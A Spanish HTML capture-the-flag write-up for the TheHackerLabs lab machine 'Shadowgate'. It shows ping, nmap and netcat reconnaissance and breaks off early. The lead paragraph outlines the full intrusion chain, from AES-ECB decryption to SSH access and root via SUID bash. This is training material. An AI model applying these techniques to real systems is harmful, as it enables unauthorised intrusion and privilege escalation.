@@ -1,0 +1,1277 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shadowgate - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-shadowgate/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Shadowgate - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-shadowgate/shadowgate.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-help/">
+          <span class="side-post-card-title">Help</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-folclore/">
+          <span class="side-post-card-title">Folclore</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Shadowgate</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-lavashop/">
+          <span class="side-post-card-title">Lavashop</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-WelcomeToTheJungle/">
+          <span class="side-post-card-title">Welcome To The Jungle</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Shadowgate - TheHackerLabs</h1>
+    <div class="post-meta">15 March 2026 · 14 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-shadowgate/shadowgate.png" alt="Shadowgate - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina bastante complicada. Después de analizar los escaneos, nos conectamos al servicio expuesto en el puerto 56789, en el que descubrimos que, al pasarle una frase que te muestra al conectarse, se nos devuelven varias cadenas codificadas en base64. A su vez, nos dirigimos a la página web activa en el puerto 8080 para aplicarle Fuzzing, encontrando una ruta que nos lleva a un login que solo acepta peticiones POST, pero que nos pide un usuario que, de momento, no tenemos. Investigando las cadenas que obtuvimos anteriormente, descubrimos que son bloques encriptados en AES-ECB, que logramos desencriptar e identificamos que algunos caracteres no cambian, siendo estos el usuario que necesita el login. Una vez que das este dato, el login te indica que debes buscar una nueva ruta para colocar un token. Volvemos a aplicar Fuzzing y descubrimos la ruta faltante, que al darle el token nos indica un cambio en un servicio, siendo este cambio reflejado en el servicio del puerto 56789, que al volver a conectarnos, nos da las credenciales de acceso al servicio SSH. Dentro de la máquina víctima, descubrimos un servicio interno que resulta ser un intérprete de Python que puede ejecutar comandos/scripts como Root. Exponemos este servicio aplicando Local Port Forwarding y logramos darle permisos SUID a la Bash para poder escalar privilegios y convertirnos en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>nc</code></li><li><code>base64</code></li><li><code>echo</code></li><li><code>ffuf</code></li><li><code>gobuster</code></li><li><code>sha256sum</code></li><li><code>openssl</code></li><li><code>CyberChef</code></li><li><code>python3</code></li><li><code>BurpSuite</code></li><li><code>nxc</code></li><li><code>ssh</code></li><li><code>ss</code></li><li><code>grep</code></li><li><code>bash</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Puerto56789">Analizando Servicio Activo en Puerto 56789</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#AES-ECB">Desencriptando Bloques Cifrados con AES-ECB</a>
+          <ul>
+            <li><a href="#CyberChefPython">Desencriptando Bloques AES-ECB con CyberChef y Script de Python</a></li>
+          </ul>
+        </li>
+        <li><a href="#fuzz2SSH">Identificando Ruta para Colocar Token y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Privesc">Aplicando Local Port Forwarding para Abusar de Servicio Interno y Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Puerto56789">Analizando Servicio Activo en Puerto 56789</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#AES-ECB">Desencriptando Bloques Cifrados con AES-ECB</a>
+          <ul>
+            <li><a href="#CyberChefPython">Desencriptando Bloques AES-ECB con CyberChef y Script de Python</a></li>
+          </ul>
+        </li>
+        <li><a href="#fuzz2SSH">Identificando Ruta para Colocar Token y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Privesc">Aplicando Local Port Forwarding para Abusar de Servicio Interno y Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.100.220
+</span></span><span style="display:flex;"><span>PING 192.168.100.220 <span style="color:#f92672">(</span>192.168.100.220<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.48 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.731 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.849 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.913 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.100.220 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3045ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.731/0.992/1.475/0.286 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.100.220 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-10 11:40 -0600
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 11:40
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.220 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 11:40, 0.44s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 11:40
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.220 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.100.220
+</span></span><span style="display:flex;"><span>Discovered open port 8080/tcp on 192.168.100.220
+</span></span><span style="display:flex;"><span>Discovered open port 56789/tcp on 192.168.100.220
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 11:40, 9.04s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.220
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.0012s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2026-03-10 11:40:32 CST <span style="color:#66d9ef">for</span> 9s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE    REASON
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh        syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>56789/tcp open  unknown    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.67 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65546</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65546</span> <span style="color:#f92672">(</span>2.622MB
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Encontramos 3 puertos abiertos, pero me da curiosidad el <strong>puerto 8080</strong> y el <strong>puerto 56789</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,8080,56789 192.168.100.220 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-10 11:41 -0600
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.220
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00080s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp  open  http    Werkzeug httpd 3.1.3 <span style="color:#f92672">(</span>Python 3.12.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>56789/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely
+</span></span><span style="display:flex;"><span>|     patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>|     Access denied. The gate remains closed.
+</span></span><span style="display:flex;"><span>|   NULL: 
+</span></span><span style="display:flex;"><span>|     Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely
+</span></span><span style="display:flex;"><span>|     patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>|_    Listening... but no response.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port56789-TCP:V<span style="color:#f92672">=</span>7.98%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>3/10%Time<span style="color:#f92672">=</span>69B057B5%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>N
+</span></span><span style="display:flex;"><span>SF:ULL,AA,<span style="color:#e6db74">&#34;Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:locked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence\x20always\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20matters\.\nListening\.\.\.\x20but\x20no\x20response\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLi
+</span></span><span style="display:flex;"><span>SF:nes,B4,<span style="color:#e6db74">&#34;Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:locked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence\x20always\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20matters\.\nAccess\x20denied\.\x20The\x20gate\x20remains\x20closed\.\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,B4,<span style="color:#e6db74">&#34;Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20door
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:s\x20are\x20locked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:closely\xe2\x80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20always\x20matters\.\nAccess\x20denied\.\x20The\x20gate\x20remains\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20closed\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,B4,<span style="color:#e6db74">&#34;Shadow\x20Gate\x20v1\.0\x20::\x20Not\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20all\x20doors\x20are\x20locked\.\x20Some\x20wait\x20for\x20n0cturne\.\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Listen\x20closely\xe2\x80\x94patterns\x20hide\x20in\x20the\x20noise\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.\x20Sequence\x20always\x20matters\.\nAccess\x20denied\.\x20The\x20gate
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20remains\x20closed\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,B4,<span style="color:#e6db74">&#34;Shadow\x20Gate\x20v1\.0\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20::\x20Not\x20all\x20doors\x20are\x20locked\.\x20Some\x20wait\x20for\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20n0cturne\.\x20Listen\x20closely\xe2\x80\x94patterns\x20hide\x20in\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:the\x20noise\.\x20Sequence\x20always\x20matters\.\nAccess\x20denied\.\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20The\x20gate\x20remains\x20closed\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,B4,<span style="color:#e6db74">&#34;Shadow\x20Gate\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20locked\.\x20Some\x20wai
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\x80\x94patterns\x20hide
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20in\x20the\x20noise\.\x20Sequence\x20always\x20matters\.\nAccess\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:denied\.\x20The\x20gate\x20remains\x20closed\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqT
+</span></span><span style="display:flex;"><span>SF:CP,B4,<span style="color:#e6db74">&#34;Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20l
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ocked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence\x20always\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0matters\.\nAccess\x20denied\.\x20The\x20gate\x20remains\x20closed\.\n&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.69 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Después de analizar los escaneos, esto es lo más destacado:</p>
+<ul>
+<li>La página web activa en el <strong>puerto 8080</strong> parece que solo muestra el <strong>código de estado 403</strong>, por lo que puede que no tengamos acceso a la página o no estamos entrando a la ruta correcta.</li>
+<li>El servicio del <strong>puerto 56789</strong> muestra algunos mensajes y parece que podemos conectarnos a este.</li>
+</ul>
+<p>Antes de ir a la página web, investiguemos un poco más sobre el servicio del <strong>puerto 56789</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="Puerto56789">Analizando Servicio Activo en Puerto 56789</h3>
+<p>Probemos a conectarnos a ese puerto usando <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 192.168.100.220 <span style="color:#ae81ff">56789</span>
+</span></span><span style="display:flex;"><span>Shadow Gate v1.0 :: Not all doors are locked. Some wait <span style="color:#66d9ef">for</span> n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Access denied. The gate remains closed
+</span></span></code></pre></div><p>Necesitamos alguna clave o una contraseña para que nos dé acceso a lo que sea que muestre.</p>
+<p>Curiosamente, el mensaje tiene la frase <strong>n0cturne</strong>, que parece más una contraseña o clave agregada intencionalmente.</p>
+<p>Probémosla:</p>
